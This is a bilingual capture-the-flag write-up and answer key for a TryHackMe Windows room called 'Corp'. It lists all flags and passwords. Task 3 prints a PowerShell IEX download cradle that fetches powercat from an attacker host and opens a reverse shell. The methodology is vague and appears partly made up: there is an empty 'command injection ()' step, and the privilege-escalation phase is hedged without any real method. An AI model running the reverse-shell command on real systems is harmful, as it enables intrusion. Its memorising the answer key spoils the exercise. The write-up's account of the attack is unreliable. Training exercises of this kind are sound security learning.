# Corp

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| Easy | Offensive Security / Windows exploitation | `corp` | https://tryhackme.com/room/corp | 01 Level Easy | TryHackMe | Web server / command injection / reverse shell / powershell / credenciales locales / escalada de privilegios / desplazamiento lateral | Comprometer un servidor Windows desde la explotación de una aplicación web (command injection) hasta obtener una shell y escalar privilegios para robar la bandera de administrador. |

---

**Contexto:** Sala de ataque dirigida a una máquina Windows en la que se combina reconocimiento web con explotación de una inyección de comandos en la aplicación para conseguir una shell. A partir de ahí se enumeran credenciales locales del usuario y se pasa a la fase final de escalada de privilegios a la cuenta de administrador del sistema, capturando las banderas de usuario y de administrador.

> **ES:** "En esta sala atacamos una máquina Windows desplegada en la red. Se explota una aplicación web vulnerable a inyección de comandos para obtener acceso inicial y, posteriormente, se escalan privilegios hasta dominar el sistema."
> **EN:** "In this room we attack a deployed Windows machine. We exploit a web application vulnerable to command injection to gain initial access and then escalate privileges to take over the system."

## Solucionario

### Task 1: Introducción / Introduction

**Explicación:** Se presenta la sala y se prepara el entorno: desplegar la máquina víctima y tener a mano el host de ataque (Kali) con la herramienta de reverse shell. No requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | He desplegado la máquina y estoy listo para empezar. / I've deployed the machine and I'm ready to start. | `No answer needed` |

---

### Task 2: Reconocimiento y bandera web / Reconnaissance and web flag

**Explicación:** Se lanza un escaneo de puertos y servicios contra la máquina Windows. En el puerto web se encuentra una aplicación vulnerable: el campo de entrada ejecuta comandos del sistema, lo que permite confirmar la inyección de comandos y localizar la primera bandera que expone la propia aplicación.

```bash
nmap -sV -sC <IP>
# Tras encontrar el servicio web, probar la inyección de comandos:
<IP> | whoami
# Localizar y recuperar la bandera expuesta por el servidor web.
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Ejecuta la enumeración inicial del servicio web. / Perform the initial enumeration of the web service. | `No answer needed` |
| 2 | ¿Cuál es la bandera que expone la aplicación web? / What is the flag exposed by the web application? | `flag{a12a41b5f8111327690f836e9b302f0b}` |

---

### Task 3: Obtención de shell / Getting a foothold

**Explicación:** Aprovechando la inyección de comandos se ejecuta una reverse shell en la máquina Windows. Una vez dentro se enumera el sistema y las credenciales locales: se identifica el usuario de la sesión (`fela`) y se recupera su contraseña desde los ficheros/registro del sistema. Con esas credenciales se valida el acceso y se obtiene la bandera de usuario.

```powershell
# Reverse shell a través de la inyección de comandos (ej. con powercat):
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p 4444 -e cmd"
# Enumerar credenciales:
whoami
net user fela
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el nombre de usuario de la cuenta local comprometida? / What is the username of the compromised local account? | `fela` |
| 2 | Comprueba el acceso con la cuenta obtenida. / Verify access with the obtained account. | `No answer needed` |
| 3 | ¿Cuál es la contraseña del usuario? / What is the password for the user? | `rubenF124` |
| 4 | ¿Cuál es la bandera de usuario? / What is the user flag? | `flag{bde1642535aa396d2439d86fe54a36e4}` |

---

### Task 4: Escalada de privilegios / Privilege escalation

**Explicación:** En la fase final se obtienen las credenciales de la cuenta de administrador (o del mecanismo que permite ejecutar con privilegios elevados) y se valida el acceso de administrador. Con el acceso elevado se recupera la bandera final de administrador.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la contraseña de la cuenta de administrador? / What is the password for the administrator account? | `tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;​ $T ` |
| 2 | ¿Cuál es la bandera de administrador? / What is the flag of the administrator? | `THM{g00d_j0b_SYS4DM1n_M4s73R}` |

---

| # | Task | Pregunta | Respuesta |
|---|------|----------|-----------|
| 1 | Task 1 | Introducción. / Introduction. | `No answer needed` |
| 2 | Task 2 | Ejecuta la enumeración inicial. / Perform the initial enumeration. | `No answer needed` |
| 3 | Task 2 | ¿Cuál es la bandera web? / What is the web flag? | `flag{a12a41b5f8111327690f836e9b302f0b}` |
| 4 | Task 3 | ¿Cuál es el usuario de la cuenta comprometida? / What is the username of the compromised account? | `fela` |
| 5 | Task 3 | Verifica el acceso. / Verify access. | `No answer needed` |
| 6 | Task 3 | ¿Cuál es la contraseña del usuario? / What is the password for the user? | `rubenF124` |
| 7 | Task 3 | ¿Cuál es la bandera de usuario? / What is the user flag? | `flag{bde1642535aa396d2439d86fe54a36e4}` |
| 8 | Task 4 | ¿Cuál es la contraseña de administrador? / What is the administrator password? | `tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;​ $T ` |
| 9 | Task 4 | ¿Cuál es la bandera de administrador? / What is the administrator flag? | `THM{g00d_j0b_SYS4DM1n_M4s73R}` |

---

**Metodología:** Escaneo con Nmap del servicio web -> identificar la inyección de comandos probando con `whoami` -> reverse shell (powercat/powershell IEX) -> enumeración de usuarios y credenciales locales -> validación de credenciales de usuario -> enumeración del mecanismo de elevación -> obtención de credenciales de administrador -> acceso elevado y captura de la bandera final.

### Cadena de ataque / Attack Chain

```text
nmap -> descubrir web -> command injection () + whoami -> reverse shell (powercat) -> whoami -> enumerar credenciales (fela) -> password rubenF124 -> validar cuenta -> escalar a Administrador -> conseguir admin password -> bandera de administrador
```

**Learning chain:** Nmap -> reconocimiento web -> command injection -> powershell IEX -> reverse shell -> enumeración local -> credenciales (fela/rubenF124) -> escalada -> Administrator -> flag.

**Lección:** *Una pequeña inyección de comandos en un formulario web puede convertirse en un acceso completo al sistema si encadenamos la shell con una correcta enumeración de credenciales locales.*

**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter), T1105 (Ingress Tool Transfer / download de powercat), T1078 (Valid Accounts), T1068 (Exploitation for Privilege Escalation)

**Fuente:** [TryHackMe - Corp](https://tryhackme.com/room/corp)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.